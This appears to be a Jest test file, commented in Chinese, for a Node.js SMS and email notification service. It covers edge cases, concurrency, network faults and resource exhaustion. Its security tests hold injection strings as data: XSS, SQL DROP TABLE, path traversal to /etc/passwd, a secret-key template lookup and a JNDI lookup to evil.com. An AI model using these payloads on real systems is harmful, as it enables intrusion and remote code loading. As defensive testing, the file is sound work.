const NotificationsService = require('../../server/services/notificationsService');
const testData = require('../fixtures/notificationTestData');
const axios = require('axios');
const nodemailer = require('nodemailer');

jest.mock('axios');
jest.mock('nodemailer');
jest.mock('fs');
jest.mock('node-cron');

describe('NotificationsService - Edge Conditions Tests', () => {
  let mockAxios, mockTransporter;

  beforeEach(() => {
    jest.clearAllMocks();
    
    // Reset singleton state
    NotificationsService.notificationHistory = [];
    NotificationsService.scheduledNotifications = new Map();
    
    mockAxios = axios;
    mockTransporter = {
      sendMail: jest.fn().mockResolvedValue({
        messageId: 'test_email_123',
        response: '250 OK'
      })
    };
    nodemailer.createTransporter.mockReturnValue(mockTransporter);
  });

  describe('极端输入数据测试', () => {
    test('空字符串和null输入处理', async () => {
      // Setup axios mock for this test
      mockAxios.post.mockResolvedValue({
        data: { message_id: 'test_null_123', cost: 0.05 }
      });

      const testCases = [
        { recipients: '', message: '', description: '空字符串' },
        { recipients: null, message: null, description: 'null值' },
        { recipients: undefined, message: undefined, description: 'undefined值' },
        { recipients: [], message: '', description: '空数组' },
        { recipients: [''], message: '', description: '包含空字符串的数组' },
        { recipients: [null], message: null, description: '包含null的数组' }
      ];

      for (const testCase of testCases) {
        const result = await NotificationsService.sendSMS(testCase.recipients, testCase.message);
        
        expect(result.success).toBe(true); // 服务应该优雅处理
        if (Array.isArray(testCase.recipients)) {
          expect(result.results).toHaveLength(testCase.recipients.length);
        }
        
        console.log(`${testCase.description}: ${result.success ? '✅' : '❌'} 处理正确`);
      }
    });

    test('超长文本内容处理', async () => {
      const testCases = [
        { 
          length: 1000, 
          description: '1KB文本',
          message: 'x'.repeat(1000)
        },
        {
          length: 10000,
          description: '10KB文本', 
          message: 'y'.repeat(10000)
        },
        {
          length: 100000,
          description: '100KB文本',
          message: 'z'.repeat(100000)
        }
      ];

      mockAxios.post.mockResolvedValue({
        data: { message_id: 'long_text_123', cost: 0.50 }
      });

      for (const testCase of testCases) {
        const startTime = Date.now();
        const result = await NotificationsService.sendSMS('13800138000', testCase.message);
        const duration = Date.now() - startTime;

        expect(result.success).toBe(true);
        expect(duration).toBeLessThan(5000); // 5秒内处理完成
        
        console.log(`${testCase.description}: 处理时间${duration}ms`);
      }
    });

    test('特殊字符和Unicode处理', async () => {
      const specialCharacters = [
        { char: '🚨📢🌪️⚡💧', description: 'Emoji表情符号' },
        { char: '\\n\\r\\t', description: '转义字符' },
        { char: '<script>alert("xss")</script>', description: 'HTML/Script注入' },
        { char: 'SELECT * FROM users; DROP TABLE users;', description: 'SQL注入' },
        { char: '${process.env.SECRET_KEY}', description: '模板注入' },
        { char: '../../etc/passwd', description: '路径遍历' },
        { char: 'ñáéíóú中文日本語한국어العربية', description: '多语言Unicode' },
        { char: '\u0000\u001f\u007f\u009f', description: '控制字符' }
      ];

      mockAxios.post.mockResolvedValue({
        data: { message_id: 'special_char_123' }
      });

      for (const test of specialCharacters) {
        const message = `测试特殊字符: ${test.char}`;
        const result = await NotificationsService.sendSMS('13800138000', message);

        expect(result.success).toBe(true);
        expect(result.results[0].success).toBe(true);
        
        // 验证历史记录中正确保存了特殊字符
        const history = NotificationsService.getNotificationHistory();
        const lastRecord = history.history[history.history.length - 1];
        expect(lastRecord.message).toContain(test.char);
        
        console.log(`${test.description}: ✅ 正确处理`);
      }
    });

    test('极端时间和日期处理', async () => {
      const extremeDates = [
        new Date('1970-01-01T00:00:00.000Z'), // Unix时间戳开始
        new Date('2038-01-19T03:14:07.000Z'), // 32位时间戳极限
        new Date('2100-12-31T23:59:59.999Z'), // 遥远未来
        new Date('1900-01-01T00:00:00.000Z'), // 遥远过去
        new Date(0), // 时间戳0
        new Date(Number.MAX_SAFE_INTEGER), // 最大安全整数
        new Date(-8640000000000000), // JS最小日期
        new Date(8640000000000000)   // JS最大日期
      ];

      for (const date of extremeDates) {
        if (date.getTime() > Date.now()) {
          // 测试未来日期的计划任务
          const result = NotificationsService.scheduleNotification(
            { message: `极端日期测试: ${date.toISOString()}` },
            date,
            { type: 'sms', recipients: ['13800138000'] }
          );

          if (date.getFullYear() <= 2100) {
            expect(result.success).toBe(true);
          } else {
            expect(result.success).toBe(false); // 过于极端的日期应该失败
          }
        }
      }
    });
  });

  describe('资源耗尽和限制测试', () => {
    test('内存压力测试 - 大量并发请求', async () => {
      const concurrentRequests = 1000;
      const promises = [];

      mockAxios.post.mockResolvedValue({
        data: { message_id: 'concurrent_123' }
      });

      const initialMemory = process.memoryUsage();

      // 创建大量并发请求
      for (let i = 0; i < concurrentRequests; i++) {
        const promise = NotificationsService.sendSMS(
          `138${String(i).padStart(8, '0')}`,
          `并发压力测试 ${i}`
        ).catch(error => ({ success: false, error: error.message }));
        
        promises.push(promise);
      }

      const results = await Promise.all(promises);
      const finalMemory = process.memoryUsage();
      const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;

      // 验证结果
      const successCount = results.filter(r => r.success).length;
      expect(successCount).toBeGreaterThan(concurrentRequests * 0.9); // 至少90%成功

      // 验证内存使用合理（不应超过200MB增长）
      expect(memoryIncrease).toBeLessThan(200 * 1024 * 1024);

      console.log(`并发压力测试: ${successCount}/${concurrentRequests} 成功, 内存增长: ${(memoryIncrease/1024/1024).toFixed(2)}MB`);
    });

    test('磁盘空间不足模拟', async () => {
      const fs = require('fs');
      
      // 模拟磁盘写入失败
      fs.writeFileSync.mockImplementation(() => {
        throw new Error('ENOSPC: no space left on device');
      });

      fs.existsSync.mockReturnValue(true);
      fs.mkdirSync.mockImplementation(() => {});

      // 尝试备份通知历史（应该优雅失败）
      await NotificationsService.backupNotificationHistory();

      // 服务应该继续工作，即使备份失败
      const result = await NotificationsService.sendSMS('13800138000', '磁盘空间测试');
      expect(result.success).toBe(true);
    });

    test('计划任务数量限制测试', () => {
      const maxTasks = 10000;
      const futureTime = new Date(Date.now() + 3600000);

      // 创建大量计划任务
      for (let i = 0; i < maxTasks; i++) {
        const scheduleTime = new Date(futureTime.getTime() + i * 1000);
        NotificationsService.scheduleNotification(
          { message: `大量任务测试 ${i}` },
          scheduleTime,
          { type: 'sms', recipients: ['13800138000'] }
        );
      }

      expect(NotificationsService.scheduledNotifications.size).toBeLessThanOrEqual(maxTasks);

      // 测试清理性能
      const startTime = Date.now();
      NotificationsService.cleanupExpiredSchedules();
      const duration = Date.now() - startTime;

      expect(duration).toBeLessThan(5000); // 5秒内完成清理
      console.log(`大量计划任务清理: ${duration}ms`);
    });

    test('历史记录存储限制测试', () => {
      const maxRecords = 50000;
      
      // 快速添加大量历史记录
      for (let i = 0; i < maxRecords; i++) {
        NotificationsService.addToHistory('limit_test', {
          id: i,
          message: `限制测试 ${i}`,
          timestamp: new Date(),
          results: [{ success: true }]
        });

        // 每5000条检查一次限制
        if (i % 5000 === 0 && i > 0) {
          expect(NotificationsService.notificationHistory.length).toBeLessThanOrEqual(10000);
        }
      }

      // 最终检查自动截断
      expect(NotificationsService.notificationHistory.length).toBe(5000);
      
      // 验证保留的是最新记录
      const lastRecord = NotificationsService.notificationHistory[4999];
      expect(lastRecord.id).toBeGreaterThan(40000);
    });
  });

  describe('网络和API异常测试', () => {
    test('网络间歇性故障模拟', async () => {
      let attemptCount = 0;
      const failurePattern = [true, false, true, false, false]; // 失败模式

      mockAxios.post.mockImplementation(() => {
        const shouldFail = failurePattern[attemptCount % failurePattern.length];
        attemptCount++;

        if (shouldFail) {
          return Promise.reject({
            code: 'ECONNRESET',
            message: '网络连接被重置'
          });
        }

        return Promise.resolve({
          data: { message_id: 'intermittent_success_123' }
        });
      });

      const recipients = Array.from({ length: 10 }, (_, i) => `138${String(i).padStart(8, '0')}`);
      const result = await NotificationsService.sendSMS(recipients, '间歇性故障测试');

      // 验证部分成功
      expect(result.success).toBe(true);
      expect(result.totalSent).toBeGreaterThan(0);
      expect(result.totalFailed).toBeGreaterThan(0);

      console.log(`间歇性故障测试: 成功${result.totalSent}, 失败${result.totalFailed}`);
    });

    test('API响应格式异常处理', async () => {
      const malformedResponses = [
        { data: null },
        { data: undefined },
        { data: 'not_json_string' },
        { data: { unexpected_format: true } },
        { data: [] }, // 数组而不是对象
        { status: 200 }, // 缺少data字段
        // 完全空响应
        undefined
      ];

      for (let i = 0; i < malformedResponses.length; i++) {
        mockAxios.post.mockResolvedValueOnce(malformedResponses[i]);

        const result = await NotificationsService.sendSMS('13800138000', `异常响应测试 ${i}`);
        
        // 服务应该优雅处理异常响应
        expect(result.success).toBe(true);
        // 可能成功也可能失败，但不应该崩溃
        expect(result.results).toBeDefined();
        expect(Array.isArray(result.results)).toBe(true);
      }
    });

    test('HTTP状态码边界测试', async () => {
      const statusCodes = [
        { code: 200, expected: 'success' },
        { code: 201, expected: 'success' },
        { code: 400, expected: 'client_error' },
        { code: 401, expected: 'auth_error' },
        { code: 403, expected: 'forbidden' },
        { code: 404, expected: 'not_found' },
        { code: 429, expected: 'rate_limit' },
        { code: 500, expected: 'server_error' },
        { code: 502, expected: 'bad_gateway' },
        { code: 503, expected: 'service_unavailable' },
        { code: 504, expected: 'timeout' }
      ];

      for (const statusTest of statusCodes) {
        if (statusTest.code >= 400) {
          // 错误状态码
          mockAxios.post.mockRejectedValueOnce({
            response: { status: statusTest.code },
            message: `HTTP ${statusTest.code} Error`
          });
        } else {
          // 成功状态码
          mockAxios.post.mockResolvedValueOnce({
            status: statusTest.code,
            data: { message_id: `status_${statusTest.code}_123` }
          });
        }

        const result = await NotificationsService.sendSMS('13800138000', `状态码测试 ${statusTest.code}`);
        
        expect(result.success).toBe(true); // 服务层应该处理所有状态码
        console.log(`HTTP ${statusTest.code}: ${result.results[0].success ? '✅' : '❌'} 处理正确`);
      }
    });

    test('超时和重试机制测试', async () => {
      let callCount = 0;
      const timeoutDurations = [100, 200, 500, 1000]; // 递增延迟

      mockAxios.post.mockImplementation(() => {
        return new Promise((resolve, reject) => {
          const delay = timeoutDurations[callCount] || 100;
          callCount++;

          setTimeout(() => {
            if (callCount <= 3) {
              reject({ code: 'ECONNABORTED', message: '请求超时' });
            } else {
              resolve({ data: { message_id: 'retry_success_123' } });
            }
          }, delay);
        });
      });

      const startTime = Date.now();
      const result = await NotificationsService.sendSMS('13800138000', '重试机制测试');
      const duration = Date.now() - startTime;

      // 验证最终成功或合理失败
      expect(result.success).toBe(true);
      expect(duration).toBeGreaterThan(100); // 至少经历了一些重试延迟

      console.log(`重试机制测试: ${callCount}次尝试, 耗时${duration}ms`);
    });
  });

  describe('数据一致性和竞态条件测试', () => {
    test('并发历史记录写入竞态测试', async () => {
      const concurrentWrites = 100;
      const promises = [];

      // 创建并发的历史记录写入
      for (let i = 0; i < concurrentWrites; i++) {
        const promise = new Promise(resolve => {
          setTimeout(() => {
            NotificationsService.addToHistory('race_test', {
              id: i,
              timestamp: new Date(),
              threadId: `thread_${i}`,
              results: [{ success: true }]
            });
            resolve(i);
          }, Math.random() * 10); // 随机延迟0-10ms
        });
        promises.push(promise);
      }

      await Promise.all(promises);

      // 验证所有记录都被正确添加
      const history = NotificationsService.getNotificationHistory();
      expect(history.total).toBe(concurrentWrites);
      
      // 验证没有数据损坏
      const raceTestRecords = history.history.filter(h => h.type === 'race_test');
      expect(raceTestRecords.length).toBe(concurrentWrites);
      
      // 验证每个记录都有唯一的threadId
      const threadIds = raceTestRecords.map(r => r.threadId);
      const uniqueThreadIds = new Set(threadIds);
      expect(uniqueThreadIds.size).toBe(concurrentWrites);
    });

    test('计划任务状态竞态条件测试', async () => {
      const futureTime = new Date(Date.now() + 60000);
      
      // 创建计划任务
      const scheduleResult = NotificationsService.scheduleNotification(
        { message: '竞态条件测试' },
        futureTime,
        { type: 'sms', recipients: ['13800138000'] }
      );

      const taskId = scheduleResult.scheduleId;

      // 模拟多个并发操作
      const operations = [
        // 执行任务
        () => NotificationsService.executeScheduledNotification(taskId),
        // 取消任务
        () => NotificationsService.cancelScheduledNotification(taskId),
        // 再次执行任务
        () => NotificationsService.executeScheduledNotification(taskId)
      ];

      // 并发执行操作
      const results = await Promise.allSettled(operations.map(op => op()));

      // 验证系统状态一致性
      const finalTask = NotificationsService.scheduledNotifications.get(taskId);
      
      // 任务应该处于确定状态（取消或完成），不应该处于中间状态
      if (finalTask) {
        expect(['pending', 'executing', 'completed', 'failed', 'cancelled']).toContain(finalTask.status);
      }

      console.log(`竞态条件测试: 最终状态 ${finalTask?.status || '任务已删除'}`);
    });

    test('统计计算原子性测试', async () => {
      const operations = [];
      
      // 创建多个并发的统计相关操作
      for (let i = 0; i < 50; i++) {
        // 添加历史记录
        operations.push(() => {
          NotificationsService.addToHistory('atomic_test', {
            id: i,
            results: [{ success: i % 3 !== 0 }] // 约66%成功率
          });
        });
        
        // 计算统计信息
        if (i % 10 === 0) {
          operations.push(() => NotificationsService.getNotificationStats());
        }
      }

      // 随机顺序并发执行
      const shuffledOps = operations.sort(() => Math.random() - 0.5);
      await Promise.all(shuffledOps.map(op => Promise.resolve().then(op)));

      // 验证最终统计的一致性
      const finalStats = NotificationsService.getNotificationStats();
      expect(finalStats.success).toBe(true);
      expect(finalStats.stats.total).toBe(50);
      
      // 验证成功率计算正确
      const atomicTestStats = finalStats.stats.successRate.atomic_test;
      expect(atomicTestStats).toBeDefined();
      expect(parseFloat(atomicTestStats.rate)).toBeCloseTo(66.67, 1); // 约66.67%
    });
  });

  describe('安全和防护测试', () => {
    test('输入验证绕过尝试', async () => {
      const maliciousInputs = [
        // 手机号注入尝试
        { phone: '13800138000; DELETE * FROM users;', type: 'sql_injection' },
        { phone: '13800138000\n\rExtra-Header: malicious', type: 'header_injection' },
        { phone: '13800138000${jndi:ldap://evil.com}', type: 'jndi_injection' },
        { phone: '13800138000/../../../etc/passwd', type: 'path_traversal' },
        
        // 消息内容注入
        { message: '<script>alert("xss")</script>', type: 'xss_attempt' },
        { message: '{{constructor.constructor("alert(1)")()}}', type: 'template_injection' },
        { message: '${7*7}#{7*7}%{7*7}', type: 'expression_injection' },
        { message: 'javascript:alert(1)', type: 'javascript_protocol' }
      ];

      for (const input of maliciousInputs) {
        const phone = input.phone || '13800138000';
        const message = input.message || '正常消息';
        
        const result = await NotificationsService.sendSMS(phone, message);
        
        // 服务应该安全处理恶意输入
        expect(result.success).toBe(true);
        
        // 验证输入没有被执行（通过检查历史记录）
        const history = NotificationsService.getNotificationHistory();
        const lastRecord = history.history[history.history.length - 1];
        
        // 特殊字符应该被保留或转义，不应该被执行
        if (input.message) {
          expect(lastRecord.message).toContain(input.message);
        }
        
        console.log(`安全测试 ${input.type}: ✅ 安全处理`);
      }
    });

    test('DoS攻击防护测试', async () => {
      const attackPatterns = [
        // 大量短时间请求
        { type: 'burst', count: 1000, interval: 0 },
        // 持续高频请求
        { type: 'sustained', count: 100, interval: 10 },
        // 大负载请求
        { type: 'payload', count: 10, size: 100000 }
      ];

      for (const pattern of attackPatterns) {
        const promises = [];
        const startTime = Date.now();

        for (let i = 0; i < pattern.count; i++) {
          const delay = pattern.interval * i;
          const message = pattern.type === 'payload' 
            ? 'x'.repeat(pattern.size)
            : `DoS测试 ${pattern.type} ${i}`;

          const promise = new Promise(resolve => {
            setTimeout(async () => {
              try {
                const result = await NotificationsService.sendSMS(`138${String(i).padStart(8, '0')}`, message);
                resolve({ success: true, result });
              } catch (error) {
                resolve({ success: false, error: error.message });
              }
            }, delay);
          });

          promises.push(promise);
        }

        const results = await Promise.all(promises);
        const duration = Date.now() - startTime;
        const successCount = results.filter(r => r.success).length;

        // 系统应该保持响应，不应该完全崩溃
        expect(successCount).toBeGreaterThan(0);
        
        // 应该有一定的防护机制（不是100%成功）
        const successRate = successCount / pattern.count;
        if (pattern.type === 'burst') {
          expect(successRate).toBeLessThan(1.0); // 应该有限流
        }

        console.log(`DoS防护测试 ${pattern.type}: ${successCount}/${pattern.count} 成功, 耗时${duration}ms`);
      }
    });

    test('内存耗尽攻击防护', async () => {
      const largeObjects = [];
      const initialMemory = process.memoryUsage().heapUsed;

      // 尝试创建大量大对象来耗尽内存
      try {
        for (let i = 0; i < 1000; i++) {
          const largeMessage = 'x'.repeat(100000); // 100KB字符串
          const recipients = Array.from({ length: 100 }, (_, j) => `139${String(i*100+j).padStart(8, '0')}`);

          // 添加到历史记录（测试内存管理）
          NotificationsService.addToHistory('memory_attack', {
            id: i,
            message: largeMessage,
            recipients: recipients,
            results: recipients.map(() => ({ success: true })),
            timestamp: new Date()
          });

          // 检查内存增长
          if (i % 100 === 0) {
            const currentMemory = process.memoryUsage().heapUsed;
            const memoryIncrease = currentMemory - initialMemory;
            
            // 如果内存增长超过500MB，停止测试
            if (memoryIncrease > 500 * 1024 * 1024) {
              console.log(`内存保护触发: 在${i}次迭代后停止`);
              break;
            }
          }
        }
      } catch (error) {
        console.log(`内存耗尽防护: ${error.message}`);
      }

      // 验证历史记录自动限制生效
      expect(NotificationsService.notificationHistory.length).toBeLessThanOrEqual(5000);

      const finalMemory = process.memoryUsage().heapUsed;
      const totalIncrease = finalMemory - initialMemory;
      
      // 内存增长应该在合理范围内
      expect(totalIncrease).toBeLessThan(1000 * 1024 * 1024); // 不超过1GB

      console.log(`内存攻击防护测试完成: 内存增长${(totalIncrease/1024/1024).toFixed(2)}MB`);
    });
  });

  describe('极端环境和系统状态测试', () => {
    test('系统资源极低状态模拟', async () => {
      // 模拟CPU密集型操作
      const cpuIntensiveTask = () => {
        const start = Date.now();
        while (Date.now() - start < 100) {
          Math.random(); // 消耗CPU
        }
      };

      // 在CPU压力下执行通知服务
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(
          Promise.all([
            // 通知服务操作
            NotificationsService.sendSMS('13800138000', `CPU压力测试 ${i}`),
            // CPU密集型任务
            new Promise(resolve => {
              setTimeout(() => {
                cpuIntensiveTask();
                resolve();
              }, Math.random() * 50);
            })
          ])
        );
      }

      const results = await Promise.all(promises);
      
      // 验证在CPU压力下服务仍能正常工作
      results.forEach(([smsResult]) => {
        expect(smsResult.success).toBe(true);
      });

      console.log('CPU压力测试: ✅ 服务在高CPU使用下正常工作');
    });

    test('时间异常处理测试', async () => {
      // 保存原始Date
      const OriginalDate = Date;
      
      // 模拟系统时间异常
      const mockDate = jest.fn(() => ({
        getTime: () => NaN,
        toISOString: () => 'Invalid Date',
        getFullYear: () => NaN,
        getMonth: () => NaN,
        getDate: () => NaN
      }));

      global.Date = mockDate;
      global.Date.now = () => NaN;

      try {
        // 在时间异常状态下测试服务
        const result = await NotificationsService.sendSMS('13800138000', '时间异常测试');
        
        // 服务应该能够处理时间异常
        expect(result.success).toBe(true);
        
        // 尝试创建计划任务
        const scheduleResult = NotificationsService.scheduleNotification(
          { message: '时间异常计划任务' },
          new Date('2024-12-31'),
          { type: 'sms', recipients: ['13800138000'] }
        );

        // 应该优雅失败或使用默认时间
        expect(scheduleResult).toBeDefined();
        
      } finally {
        // 恢复原始Date
        global.Date = OriginalDate;
      }

      console.log('时间异常处理: ✅ 服务在时间异常下稳定运行');
    });

    test('文件系统只读状态测试', async () => {
      const fs = require('fs');
      
      // 模拟文件系统只读
      fs.writeFileSync.mockImplementation(() => {
        throw new Error('EROFS: read-only file system');
      });

      fs.mkdirSync.mockImplementation(() => {
        throw new Error('EROFS: read-only file system');
      });

      // 测试需要写文件的操作
      await NotificationsService.backupNotificationHistory();
      
      // 服务应该继续工作，即使无法写入文件
      const result = await NotificationsService.sendSMS('13800138000', '只读文件系统测试');
      expect(result.success).toBe(true);

      console.log('只读文件系统测试: ✅ 服务在文件系统只读时正常工作');
    });

    test('极端负载下的优雅降级', async () => {
      // 模拟系统极端负载
      const heavyLoadSimulation = async () => {
        const operations = [];
        
        // 创建大量操作
        for (let i = 0; i < 500; i++) {
          operations.push(
            NotificationsService.sendSMS(`138${String(i).padStart(8, '0')}`, `负载测试 ${i}`)
          );
        }

        // 同时执行所有操作
        const results = await Promise.allSettled(operations);
        
        const successCount = results.filter(r => r.status === 'fulfilled' && r.value.success).length;
        const failureCount = results.length - successCount;

        return { successCount, failureCount, totalCount: results.length };
      };

      const loadTestResult = await heavyLoadSimulation();

      // 在极端负载下，应该有一定的成功率，而不是完全失败
      expect(loadTestResult.successCount).toBeGreaterThan(0);
      
      // 系统应该实现优雅降级，不是全部成功也不是全部失败
      const successRate = loadTestResult.successCount / loadTestResult.totalCount;
      expect(successRate).toBeGreaterThan(0.5); // 至少50%成功率

      console.log(`极端负载测试: ${loadTestResult.successCount}/${loadTestResult.totalCount} 成功 (${(successRate*100).toFixed(1)}%)`);
    });
  });

  describe('长时间运行和稳定性测试', () => {
    test('长时间运行内存稳定性', async () => {
      const iterations = 1000;
      const memorySnapshots = [];

      for (let i = 0; i < iterations; i++) {
        // 执行各种操作
        await NotificationsService.sendSMS('13800138000', `稳定性测试 ${i}`);
        
        if (i % 100 === 0) {
          const memory = process.memoryUsage();
          memorySnapshots.push({
            iteration: i,
            heapUsed: memory.heapUsed,
            heapTotal: memory.heapTotal
          });

          // 强制垃圾回收（如果可用）
          if (global.gc) {
            global.gc();
          }
        }
      }

      // 分析内存趋势
      const firstSnapshot = memorySnapshots[0];
      const lastSnapshot = memorySnapshots[memorySnapshots.length - 1];
      const memoryGrowth = lastSnapshot.heapUsed - firstSnapshot.heapUsed;

      // 内存增长应该是合理的（不应该有严重的内存泄漏）
      expect(memoryGrowth).toBeLessThan(100 * 1024 * 1024); // 不超过100MB增长

      console.log(`长时间运行测试: ${iterations}次操作, 内存增长${(memoryGrowth/1024/1024).toFixed(2)}MB`);
    });

    test('定时任务长期稳定性', async () => {
      const taskCount = 100;
      const futureBase = Date.now() + 60000; // 1分钟后开始

      // 创建多个定时任务
      for (let i = 0; i < taskCount; i++) {
        const scheduleTime = new Date(futureBase + i * 1000); // 每秒一个任务
        NotificationsService.scheduleNotification(
          { message: `稳定性任务 ${i}` },
          scheduleTime,
          { type: 'sms', recipients: ['13800138000'] }
        );
      }

      expect(NotificationsService.scheduledNotifications.size).toBe(taskCount);

      // 模拟长时间运行中的清理操作
      for (let cycle = 0; cycle < 10; cycle++) {
        await new Promise(resolve => setTimeout(resolve, 100)); // 等待100ms
        
        // 执行清理
        NotificationsService.cleanupExpiredSchedules();
        
        // 验证系统状态一致性
        const currentTasks = NotificationsService.scheduledNotifications.size;
        expect(currentTasks).toBeLessThanOrEqual(taskCount);
      }

      console.log(`定时任务稳定性测试: 剩余任务${NotificationsService.scheduledNotifications.size}个`);
    });
  });
});